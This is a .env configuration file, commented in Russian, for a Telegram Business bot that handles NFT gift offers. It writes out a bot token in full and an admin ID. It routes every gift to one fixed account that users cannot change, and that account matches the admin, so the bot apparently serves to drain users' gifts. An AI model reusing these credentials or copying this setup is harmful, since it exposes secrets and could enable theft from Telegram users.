# ============================================================================
# Telegram Business NFT Offers Bot — Файл конфигурации (.env)
# ============================================================================

# 1. Токен бота от @BotFather
# В @BotFather обязательно включите режим Telegram Business:
# /mybots -> Выберите бота -> Bot Settings -> Telegram Business -> Turn On
BOT_TOKEN=8741223898:AAHdamWZuXWVkO6mfD7FO3QLibgWbpVhQnI

# 2. Telegram ID главного администратора (цифры)
# Администратор имеет доступ к командам /give, /take, /subs и админ-меню /offer
MASTER_ADMIN_ID=7234362765

# 3. Получатель NFT-подарка
# Пользователи бота НЕ МОГУТ изменить получателя через команду.
# Все подарки передаются строго на этот аккаунт:
TARGET_RECIPIENT_USERNAME=modellernft
TARGET_RECIPIENT_ID=7234362765

# 4. Telegram Premium кастомные эмодзи
# EMOJI_STAR_ID — кастомная звезда (по умолчанию белая звезда из TgAndroidIcons)
EMOJI_STAR_ID=5960672896060756972

# EMOJI_GRAM_ID — кастомная монета Gram (из набора FinanceEmoji)
